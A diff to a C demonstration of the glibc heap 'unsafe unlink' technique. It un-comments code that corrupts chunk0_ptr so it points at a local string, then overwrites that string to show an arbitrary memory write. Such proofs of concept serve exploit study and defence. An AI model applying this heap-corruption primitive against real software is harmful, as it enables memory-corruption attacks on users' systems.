@@ -55,18 +55,19 @@ int main()
 	printf("You can find the source of the unlink macro at https://sourceware.org/git/?p=glibc.git;a=blob;f=malloc/malloc.c;h=ef04360b918bceca424482c6db03cc5ec90c3e00;hb=07c18a008c2ed8f5660adba2b778671db159a141#l1344\n\n");
 	free(chunk1_ptr);
 	
-	printf("p->fd's value + 12 : %p\n", (uint64_t) *(&chunk0_ptr-(sizeof(uint64_t)*3)));
-	printf("p->bk's value + 8  : %p\n", (uint64_t) *(&chunk0_ptr-(sizeof(uint64_t)*2)));
+	printf("P's value : %p\n", chunk0_ptr);
+	printf("P[3]'s value : %p\n",chunk0_ptr[3]);
+	
 
-	// printf("At this point we can use chunk0_ptr to overwrite itself to point to an arbitrary location.\n");
-	// char victim_string[8];
-	// strcpy(victim_string,"Hello!~");
-	// chunk0_ptr[3] = (uint64_t) victim_string;
+	printf("At this point we can use chunk0_ptr to overwrite itself to point to an arbitrary location.\n");
+	char victim_string[8];
+	strcpy(victim_string,"Hello!~");
+	chunk0_ptr[3] = (uint64_t) victim_string;
 
-	// printf("chunk0_ptr is now pointing where we want, we use it to overwrite our victim string.\n");
-	// printf("Original value: %s\n",victim_string);
-	// chunk0_ptr[0] = 0x4141414142424242LL;
-	// printf("New Value: %s\n",victim_string);
+	printf("chunk0_ptr is now pointing where we want, we use it to overwrite our victim string.\n");
+	printf("Original value: %s\n",victim_string);
+	chunk0_ptr[0] = 0x4141414142424242LL;
+	printf("New Value: %s\n",victim_string);
 }
 
 
